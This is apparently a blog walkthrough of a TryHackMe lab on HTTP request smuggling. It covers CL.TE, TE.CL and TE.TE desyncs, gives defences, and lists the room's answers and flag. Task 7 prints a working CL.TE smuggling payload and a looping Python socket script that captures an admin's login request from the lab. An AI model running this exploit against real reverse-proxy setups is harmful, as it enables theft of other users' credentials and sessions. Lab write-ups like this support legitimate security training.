---
title: "TryHackMe HTTP Request Smuggling: CL.TE desync exploitation"
date: 2026-10-21T23:00:00+05:30
lastmod: 2026-10-21T23:00:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-smuggling/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - HTTP request smuggling
  - CL.TE
  - TE.CL
  - web application pentesting
  - advanced client-side attacks
  - reverse proxy
  - Transfer-Encoding

draft: false
description: "TryHackMe HTTP Request Smuggling walkthrough: CL.TE desync between ATS and Nginx to capture authenticated dashboard credentials via smuggled POST."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|HTTP Request Smuggling |![HTTP Request Smuggling room icon](https://cdn-images.tryhackme.com/room-icons/02c75078a8759443f0b565ce48b89589.png)|

This easy-difficulty room in the Web Application Pentesting path covers HTTP request smuggling from the ground up: how modern multi-tier architectures create desync conditions, the three smuggling variants (CL.TE, TE.CL, TE.TE), and a hands-on CL.TE exploit against Apache Traffic Server and Nginx. It sits in the Advanced Client-Side Attacks module alongside the [CORS and SOP walkthrough](/post/thm-room-corsandsop/), the [XSS walkthrough](/post/thm-room-axss/), and the [CSRF walkthrough](/post/thm-room-csrfv2/).

## Task 1: Introduction

Lab setup. HTTP request smuggling exploits disagreements between front-end and back-end servers about where one HTTP request ends and the next begins. When two servers in a pipeline parse the same byte stream differently, an attacker can inject a second request inside the first one, and that smuggled request executes in the back-end's context with the next legitimate user's session.

## Task 2: Modern Infrastructure

Modern web applications sit behind multiple layers of servers. A reverse proxy or load balancer faces the internet, forwards requests to one or more back-end servers, and the back-end processes the business logic. This architecture creates the precondition for request smuggling: two separate HTTP parsers processing the same TCP stream, each potentially prioritizing different headers to determine request boundaries.

The key component is the **Reverse Proxy**, which sits in front of one or more web servers and forwards client requests to them. Common reverse proxies include Nginx, Apache Traffic Server (ATS), HAProxy, and cloud provider load balancers.

### Answers

- **What sits in front of one or more web servers and forwards client requests to them?** **Reverse Proxy**

## Task 3: Behind the Scenes

Every HTTP request has two parts: headers and body. The body's length is communicated through one of two mechanisms:

**Content-Length** specifies the exact byte count of the body. The server reads exactly that many bytes after the blank line that ends the headers, then treats the next byte as the start of a new request.

**Transfer-Encoding: chunked** sends the body in chunks. Each chunk starts with its size in hexadecimal, followed by CRLF, then the data, then another CRLF. A chunk of size `0` signals the end of the body.

When a request carries both headers, the HTTP specification says Transfer-Encoding takes precedence and Content-Length should be ignored. In practice, not every server follows this rule, and that discrepancy is the root cause of request smuggling.

### Answers

- **What request header indicates the request or response body size in bytes?** **Content-Length**

{{< ad >}}

## Task 4: Request Smuggling CL.TE

CL.TE stands for **Content-Length/Transfer-Encoding**. The front-end server prioritizes the Content-Length header to determine the request boundary, while the back-end prioritizes Transfer-Encoding.

The attacker sends a single HTTP request with both headers. The Content-Length value covers the entire payload (including the smuggled request). The front-end reads Content-Length bytes, treats it all as one request, and forwards the entire blob to the back-end. The back-end processes Transfer-Encoding, reads chunked data until it hits `0\r\n\r\n`, and considers the first request complete. Everything after the zero-length chunk is now sitting in the back-end's input buffer, interpreted as the start of a new request.

That leftover data is the smuggled request. It prepends itself to the next legitimate request that arrives through the pipeline, poisoning or hijacking that user's interaction with the back-end.

### Answers

- **What does CL.TE stand for?** **Content-Length/Transfer-Encoding**

## Task 5: Request Smuggling TE.CL

TE.CL is the reverse of CL.TE. The front-end prioritizes Transfer-Encoding (reads chunked data until the zero-length terminator), while the back-end prioritizes Content-Length (reads a fixed number of bytes).

The attacker sends a chunked request where the final chunk contains a smuggled request. The front-end reads the entire chunked body, including the smuggled portion, as a single request. The back-end uses Content-Length to parse the body, reads fewer bytes than the front-end forwarded, and leaves the smuggled request in the buffer for the next connection.

### Answers

- **What does TE.CL stand for?** **Transfer-Encoding/Content-Length**

## Task 6: Transfer Encoding Obfuscation

TE.TE stands for **Transfer-Encoding/Transfer-Encoding**. Both servers use Transfer-Encoding, but the attacker sends a malformed or obfuscated Transfer-Encoding header that one server accepts and the other rejects.

Common obfuscation techniques include adding whitespace (`Transfer-Encoding : chunked`), using non-standard capitalization (`Transfer-encoding: chunked`), adding duplicate headers, or injecting extra characters (`Transfer-Encoding: chunkedx`). If the front-end accepts the obfuscated header and the back-end rejects it (falling back to Content-Length), the result is functionally equivalent to a TE.CL desync. If the back-end accepts and the front-end rejects, it becomes CL.TE.

### Answers

- **What does TE.TE stand for?** **Transfer-Encoding/Transfer-Encoding**

## Task 7: Walkthrough

The lab deploys Apache Traffic Server (ATS) as the front-end proxy, Nginx as the back-end server, and PHP processing the dynamic content. The application at `httprequestsmuggling.thm` is a "Develop Portal" with Home, Login, and Contact pages. The Contact form at `/contact.php` saves submissions to the `/submissions` directory.

### The exploit

This is a CL.TE vulnerability. ATS (front-end) prioritizes Content-Length. Nginx (back-end) prioritizes Transfer-Encoding. The attack smuggles a POST to `/contact.php` with a large Content-Length (500 bytes) and an open `query=` parameter. When the next legitimate request arrives, the back-end appends it to the smuggled POST's body, and the entire request (including headers, cookies, and query parameters) gets saved as a contact form submission.

The smuggling payload:

```
POST / HTTP/1.1
Host: httprequestsmuggling.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 160
Transfer-Encoding: chunked

0

POST /contact.php HTTP/1.1
Host: httprequestsmuggling.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

username=test&query=
```

ATS reads 160 bytes (the Content-Length value), sees one request, and forwards the entire body to Nginx. Nginx processes the Transfer-Encoding header, reads chunked data, hits the `0\r\n\r\n` terminator, and considers the first POST complete. The remaining bytes (the second POST to `/contact.php`) sit in the buffer and prepend to the next request that enters the pipeline.

A simulated admin user periodically visits the dashboard at `/login.php` with credentials in the query string. When the smuggled POST captures that request, the admin's full HTTP request (including the URL with the password) gets written to the `/submissions` directory.

### Executing with Python sockets

Instead of Burp Suite Intruder, a Python script sends raw HTTP requests with both headers over a TCP socket in a loop:

```python
import socket, time
TARGET, PORT = "TARGET_IP", 80
smuggled = (
    "POST /contact.php HTTP/1.1\r\n"
    "Host: httprequestsmuggling.thm\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 500\r\n\r\n"
    "username=test&query="
)
body = "0\r\n\r\n" + smuggled
payload = (
    "POST / HTTP/1.1\r\n"
    "Host: httprequestsmuggling.thm\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(body)}\r\n"
    "Transfer-Encoding: chunked\r\n\r\n"
    + body
)
for i in range(50):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((TARGET, PORT))
    s.sendall(payload.encode())
    s.recv(4096)
    s.close()
    time.sleep(0.2)
```

After a few iterations, the `/submissions` directory contains captured requests:

```
  # curl http://httprequestsmuggling.thm/submissions/
  # 2026-10-21_17-34-02.txt   499 bytes
```

Reading the captured file reveals the admin's login request with credentials in the query string:

```
  # Name: test
  # Query: GET /login.php?password=REDACTED HTTP/1.1
  # Host: linkednginx.net
  # User-Agent: HeadlessChrome/119.0.6045.105
```

Authenticating with the captured credentials loads the dashboard, which displays the flag in the page heading.

### Answers

- **What is the flag in the dashboard?** **THM{1c4N_$mU66l3!!}**

## Task 8: Conclusion

Room complete.

## Takeaways

**Request smuggling exploits the gap between specification and implementation, not a bug in either server.** ATS and Nginx are both correct HTTP servers individually. ATS follows an older convention of prioritizing Content-Length; Nginx follows the RFC and prioritizes Transfer-Encoding. Neither is broken in isolation. The vulnerability exists only in the seam between them, where the same byte stream has two valid interpretations. This is why smuggling is hard to detect: each server logs a valid request, and the smuggled payload never appears in either server's access log as a separate entry. The defence is not to fix either server but to eliminate the ambiguity: strip or normalize Transfer-Encoding at the front-end, reject requests with both headers, or use HTTP/2 between tiers (which does not use text-based framing).

**A large Content-Length on the smuggled request turns request smuggling from a desync into a data capture primitive.** The smuggled POST to `/contact.php` had Content-Length: 500 but only 20 bytes of actual body (`username=test&query=`). The remaining 480 bytes came from the next legitimate request that entered the pipeline. The server read the admin's GET request as part of the form body, URL and headers included, and saved it to disk. The attacker never needed to intercept network traffic or break encryption: the smuggled request made the back-end server itself act as the data collection endpoint, writing other users' requests to a directory the attacker could read.

Room solved 100%: 8 tasks, 8 answers.
